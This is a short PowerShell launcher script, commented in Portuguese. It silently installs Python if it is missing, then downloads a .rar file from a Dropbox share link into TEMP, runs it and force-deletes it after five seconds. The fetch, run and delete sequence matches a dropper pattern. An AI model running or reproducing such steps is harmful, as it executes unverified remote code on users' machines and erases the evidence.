# Verifica se o Python está instalado
$pythonCmd = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonCmd) {
    Write-Host "Python não encontrado. Instalando Python..." -ForegroundColor Yellow
    # Baixa o instalador do Python
    $pythonUrl = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe"
    $installerPath = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    
    # Instala o Python silenciosamente
    Start-Process -FilePath $installerPath -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -Wait
    Remove-Item $installerPath
}

# Executa o programa diretamente do Dropbox
$url = "https://www.dropbox.com/scl/fi/jave5rw3bbj755ss5c900/servidor-download.rar?dl=1"
$outputPath = "$env:TEMP\programa.rar"

try {
    # Download do arquivo
    Write-Host "Baixando programa..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    
    # Executa o programa
    Write-Host "Executando programa..." -ForegroundColor Green
    Start-Process $outputPath
    
} catch {
    Write-Host "Erro: $_" -ForegroundColor Red
} finally {
    # Limpa o arquivo após alguns segundos
    Start-Sleep -Seconds 5
    Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
} 
